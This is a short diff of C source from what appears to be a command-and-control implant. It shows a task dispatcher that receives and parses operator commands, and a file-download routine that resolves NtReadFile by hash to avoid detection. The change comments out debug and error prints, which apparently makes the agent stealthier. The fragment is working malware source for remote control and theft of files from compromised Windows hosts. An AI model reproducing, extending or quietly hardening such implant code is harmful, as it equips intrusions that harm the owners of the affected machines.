@@ -51,7 +51,7 @@ VOID CommandDispatcher() {
         PackageTransmit( Package, &DataBuffer, &DataSize );
 
         if(DataBuffer && DataSize > 0) {
-            PRINT_HEX(DataBuffer, (int)DataSize)
+            // PRINT_HEX(DataBuffer, (int)DataSize)
             ParserNew(&Parser, DataBuffer, DataSize);
             do {
                 TaskCommand = ParserGetInt32(&Parser);
@@ -509,7 +509,7 @@ VOID CommandDownload( PPARSER Parser ) {
     void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32B);
     NtReadFile_t g_nt_read_file = (NtReadFile_t) p_nt_read_file;
     if((status = g_nt_read_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize, NULL, NULL)) != 0x0) {
-        printf("NtReadFile failed with status: 0x%lx\n", status);
+        // _tprintf("NtReadFile failed with status: 0x%lx\n", status);
         goto CleanupDownload;
     }
 
